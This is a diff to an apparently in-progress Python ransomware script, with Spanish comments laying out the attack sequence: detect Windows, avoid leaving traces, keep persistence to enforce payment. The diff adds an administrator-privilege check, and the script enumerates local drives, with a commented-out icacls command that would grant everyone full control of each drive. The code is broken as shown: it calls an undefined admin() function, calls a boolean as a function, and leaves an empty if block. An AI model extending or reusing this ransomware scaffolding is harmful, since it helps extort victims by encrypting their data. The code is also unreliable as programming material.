@@ -3,6 +3,7 @@ import sys
 import platform
 import win32api
 import subprocess
+import ctypes
 
 # Secuencia de acciones del Ransomware
 # Paso 1 - En que sistema operativo o entorno se esta ejecutando el malware
@@ -17,13 +18,26 @@ import subprocess
 
 # Algunas preguntas
 # a) Debemos garantizar la persistencia del malware en el dispositivo? => Por lo menos la herramienta para garantizar el pago y la desencriptacion de los datos
+ 
+def is_admin():
+    is_admin = False
+    is_win = False
+    try:
+        is_admin = os.getuid() == 0
+    except AttributeError:
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        is_win = True
+ 
+    print ("Admin privileges: {}".format(is_admin))
+    return is_admin, is_win
 
 if __name__ == '__main__':
-    # 1
-    if not platform.system() == 'Windows':
-        sys.exit()
-        # Necesitamos no dejar huella
+    is_admin, is_win = admin()
 
+    if not is_win:
+        sys.exit()
+    if not is_admin():
+        
     # 2
     local_drives = win32api.GetLogicalDriveStrings()
     local_drives = local_drives.split('\000')[:-1]
@@ -33,6 +47,7 @@ if __name__ == '__main__':
         print(drive)
         # Necesitamos habilitar permisos
         # subprocess.check_output(['icacls.exe',r'drive','/GRANT','*S-1-1-0:F'],stderr=subprocess.STDOUT)
+    
 
 
     
